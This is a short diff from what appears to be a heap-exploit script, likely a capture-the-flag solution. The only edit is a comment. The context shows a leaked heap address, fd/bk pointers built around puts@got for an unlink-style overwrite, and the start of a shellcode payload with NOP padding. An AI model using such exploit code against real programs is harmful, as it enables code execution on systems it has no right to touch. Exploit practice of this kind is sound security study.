@@ -304,7 +304,7 @@ print "[*] 3rd chunk leaked :", hex(leak)
 
 puts = 0x609958 # puts@got
 fd = puts - 0x18
-bk = leak + 0x90 # 5th data addr
+bk = leak + 0x90 # chunk_5's data addr
 
 payload  = "\x48\x31\xF6\xeb\x13"# xor rsi, rsi; jmp 0x18;
 payload += "\x90" * 24
